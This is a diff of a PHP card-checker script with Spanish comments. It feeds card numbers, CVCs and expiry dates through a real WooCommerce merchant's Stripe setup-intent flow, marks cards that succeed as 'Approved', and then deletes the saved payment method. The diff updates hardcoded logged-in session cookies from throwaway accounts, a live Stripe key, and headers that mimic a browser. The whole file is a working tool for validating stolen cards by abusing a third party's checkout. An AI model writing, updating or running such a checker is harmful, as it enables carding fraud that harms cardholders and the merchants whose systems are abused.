@@ -2951,20 +2951,21 @@ $BinData = BinData($bin); //Extrae los datos del bin
 $cc = implode('+', $partes);
 $curl = curl_init();
 curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://hoamemberservices.com/my-account/add-payment-method/',
+  CURLOPT_URL => 'https://hoamemberservices.com/my-account/payment-methods/',
   CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
+  CURLOPT_ENCODING => '',                                                                
   CURLOPT_MAXREDIRS => 10,
   CURLOPT_TIMEOUT => 30,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-05%2017%3A36%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fupdate-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-05%2017%3A36%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fupdate-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; etBloomCookie_optin_3=true; et_bloom_optin_optin_3_8f64235d7c_imp=true; __stripe_mid=eea6ca2b-17d3-4538-a504-6a087a80ac66851e42; __stripe_sid=337ffb0d-efc1-4bb9-8fbd-ffd9f4b4671244dd9a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=Jimenez%7C1731001401%7CCzBZx9kfPDJBYaMXtoBLjqHevXVnNFrVeSWmlEPn2Fk%7C75f66fe98f5174c97872c8da71c4ea525dcd112cd950bf764a961c85189cdb4e; mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fedit-account%2F; sbjs_session=pgs%3D22%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F',
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,                                           
+  CURLOPT_CUSTOMREQUEST => 'GET',                                                         
+  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=9a113a5b-c798-4adf-b369-5d104171714f59ffb5; et_bloom_optin_optin_3_8f64235d7c_imp=true; mailchimp_user_previous_email=xipay59414%40bulatox.com; mailchimp_user_email=xipay59414%40bulatox.com; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=xipay59414%40bulatox.com%7C1736039379%7CRwmDx6j241K3cZhYxMsvwCW95Ml1lU48Dw0zOlP3elO%7C6b75b3ae5b6484b5ff5f0b6210a4b16bf2e67be21d091427d6436a34c746aab7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; etBloomCookie_optin_3=true; __stripe_sid=d590daae-403c-4e5c-8075-6c45d252a142c31711; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'sec-ch-ua-platform: "Android"',
     'Referer: https://hoamemberservices.com/my-account/payment-methods/',
   ],
 ]);
+
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
@@ -2978,6 +2979,12 @@ $pk_live = $coincidencia[0];
 curl_close($curl);
 
 /////EXTRAE EL ID//
+
+echo "$nonce\n";
+echo "$pk_live\n";
+
+
+
 $curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
@@ -2987,23 +2994,35 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10010&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2Fea0a361bb5%3B+stripe-js-v3%2Fea0a361bb5%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhoamemberservices.com&time_on_page=66639&client_attribution_metadata%5Bclient_session_id%5D=0e6aa10b-d993-4249-85d0-0edb6611a74b&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=NA&muid=eea6ca2b-17d3-4538-a504-6a087a80ac66851e42&sid=337ffb0d-efc1-4bb9-8fbd-ffd9f4b4671244dd9a&key='.$pk_live.'&_stripe_version=2024-06-20',
+  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10080&billing_details%5Baddress%5D%5Bcountry%5D=US&pasted_fields=number&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhoamemberservices.com&time_on_page=143374&client_attribution_metadata%5Bclient_session_id%5D=39977717-a330-49ea-8bda-8bfad4e083e1&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=0b04b48f-276d-4e18-b076-a9831c4f42edfac586&muid=9a113a5b-c798-4adf-b369-5d104171714f59ffb5&sid=d590daae-403c-4e5c-8075-6c45d252a142c31711&key=pk_live_519doZ4BaFP2UgItppWUDvN6lMzRQOWdAmkEmFW85zYxVwikxsEfCWrZayA4AzRxOPhPx0Ne1yRoppgSGnXehspOX005uDYXtP9&_stripe_version=2024-06-20',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'Accept: application/json',
     'Content-Type: application/x-www-form-urlencoded',
+    'sec-ch-ua-platform: "Android"',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile: ?1',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.7',
     'origin: https://js.stripe.com',
+    'sec-fetch-site: same-site',
+    'sec-fetch-mode: cors',
+    'sec-fetch-dest: empty',
     'referer: https://js.stripe.com/',
+    'priority: u=1, i',
   ],
 ]);
+
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
 $json = json_decode($response, true);
 $id = $json["id"];
 curl_close($curl);
-
+echo "$id\n";
 ////HACE EL AUTH///
+
+
 $curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://hoamemberservices.com?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
@@ -3014,23 +3033,26 @@ curl_setopt_array($curl, [
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
   CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
-  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fupdate-payment-method; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-05%2017%3A36%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fupdate-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-05%2017%3A36%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fupdate-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; etBloomCookie_optin_3=true; et_bloom_optin_optin_3_8f64235d7c_imp=true; __stripe_mid=eea6ca2b-17d3-4538-a504-6a087a80ac66851e42; __stripe_sid=337ffb0d-efc1-4bb9-8fbd-ffd9f4b4671244dd9a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=Jimenez%7C1731001401%7CCzBZx9kfPDJBYaMXtoBLjqHevXVnNFrVeSWmlEPn2Fk%7C75f66fe98f5174c97872c8da71c4ea525dcd112cd950bf764a961c85189cdb4e; sbjs_session=pgs%3D16%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F',
+  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=9a113a5b-c798-4adf-b369-5d104171714f59ffb5; et_bloom_optin_optin_3_8f64235d7c_imp=true; mailchimp_user_previous_email=xipay59414%40bulatox.com; mailchimp_user_email=xipay59414%40bulatox.com; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=xipay59414%40bulatox.com%7C1736039379%7CRwmDx6j241K3cZhYxMsvwCW95Ml1lU48Dw0zOlP3elO%7C6b75b3ae5b6484b5ff5f0b6210a4b16bf2e67be21d091427d6436a34c746aab7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; etBloomCookie_optin_3=true; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_sid=d590daae-403c-4e5c-8075-6c45d252a142c31711',
+//  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
+//  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform: "Android"',
     'X-Requested-With: XMLHttpRequest',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
     'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
+    'sec-ch-ua-mobile: ?1',
+    'Sec-GPC: 1',
+    'Accept-Language: es-US,es;q=0.7',
     'Origin: https://hoamemberservices.com',
+    'Sec-Fetch-Site: same-origin',
+    'Sec-Fetch-Mode: cors',
+    'Sec-Fetch-Dest: empty',
     'Referer: https://hoamemberservices.com/my-account/add-payment-method/',
   ],
 ]);
-/*
-$response = curl_exec($curl);
-$err = curl_error($curl);
-$json = json_decode($response, true);
-$respo = $json['data']['error']['message'];
-curl_close($curl);
-echo $respo;
-*/
+	
 $response = curl_exec($curl);
 $err = curl_error($curl);
 $json = json_decode($response, true);
@@ -3042,7 +3064,8 @@ $status = $json['data']['status'];
 curl_close($curl);
 
 if ($success === true && $status === "succeeded") {
-    $respo = "Approved (1000)";
+    $respo = "1000: Approved";
+
 
 $curl = curl_init();
 curl_setopt_array($curl, [
@@ -3053,13 +3076,23 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => 'etBloomCookie_optin_3=true; et_bloom_optin_optin_3_8f64235d7c_imp=true; __stripe_mid=eea6ca2b-17d3-4538-a504-6a087a80ac66851e42; mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fedit-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-05%2018%3A58%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-05%2018%3A58%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=13a09389-3b9c-4061-bf10-5b611f9c85d05d9c18; mailchimp.cart.previous_email=Sooppeed1983@dayrep.com; mailchimp.cart.current_email=sotiboy686@anypng.com; mailchimp_user_previous_email=sotiboy686%40anypng.com; mailchimp_user_email=sotiboy686%40anypng.com; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=Jimenez%7C1731007537%7Cs8KDHCHFTLDJAqteJuJfb3mxaMZtQWvSJFYWFeWzr7O%7C9902ee069172a0b6626f875fcdce5bc45e235f7fb156adc88021b63cd672e5d3; sbjs_session=pgs%3D42%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F',
+  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=9a113a5b-c798-4adf-b369-5d104171714f59ffb5; et_bloom_optin_optin_3_8f64235d7c_imp=true; mailchimp_user_previous_email=xipay59414%40bulatox.com; mailchimp_user_email=xipay59414%40bulatox.com; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=xipay59414%40bulatox.com%7C1736039379%7CRwmDx6j241K3cZhYxMsvwCW95Ml1lU48Dw0zOlP3elO%7C6b75b3ae5b6484b5ff5f0b6210a4b16bf2e67be21d091427d6436a34c746aab7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; etBloomCookie_optin_3=true; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_sid=d590daae-403c-4e5c-8075-6c45d252a142c31711',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'Cache-Control: max-age=0',
+    'Upgrade-Insecure-Requests: 1',
+    'Sec-GPC: 1',
+    'Accept-Language: es-US,es;q=0.7',
+    'Sec-Fetch-Site: same-origin',
+    'Sec-Fetch-Mode: navigate',
+    'Sec-Fetch-Dest: document',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
-    'Referer: https://hoamemberservices.com/my-account/payment-methods/',
+    'Referer: https://hoamemberservices.com/my-account/add-payment-method/',
   ],
 ]);
+
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
@@ -3075,8 +3108,6 @@ curl_close($curl);
 echo "$url_nonce\n";
 
 
-
-
 $curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://hoamemberservices.com/my-account/delete-payment-method'.$url_nonce.'',
@@ -3086,10 +3117,19 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => 'etBloomCookie_optin_3=true; et_bloom_optin_optin_3_8f64235d7c_imp=true; __stripe_mid=eea6ca2b-17d3-4538-a504-6a087a80ac66851e42; mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fedit-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-05%2018%3A58%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-05%2018%3A58%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=13a09389-3b9c-4061-bf10-5b611f9c85d05d9c18; mailchimp.cart.previous_email=Sooppeed1983@dayrep.com; mailchimp.cart.current_email=sotiboy686@anypng.com; mailchimp_user_previous_email=sotiboy686%40anypng.com; mailchimp_user_email=sotiboy686%40anypng.com; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=Jimenez%7C1731007537%7Cs8KDHCHFTLDJAqteJuJfb3mxaMZtQWvSJFYWFeWzr7O%7C9902ee069172a0b6626f875fcdce5bc45e235f7fb156adc88021b63cd672e5d3; sbjs_session=pgs%3D42%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F',
+  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=9a113a5b-c798-4adf-b369-5d104171714f59ffb5; et_bloom_optin_optin_3_8f64235d7c_imp=true; mailchimp_user_previous_email=xipay59414%40bulatox.com; mailchimp_user_email=xipay59414%40bulatox.com; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=xipay59414%40bulatox.com%7C1736039379%7CRwmDx6j241K3cZhYxMsvwCW95Ml1lU48Dw0zOlP3elO%7C6b75b3ae5b6484b5ff5f0b6210a4b16bf2e67be21d091427d6436a34c746aab7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; etBloomCookie_optin_3=true; __stripe_sid=d590daae-403c-4e5c-8075-6c45d252a142c31711; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F',
   CURLOPT_HTTPHEADER => [
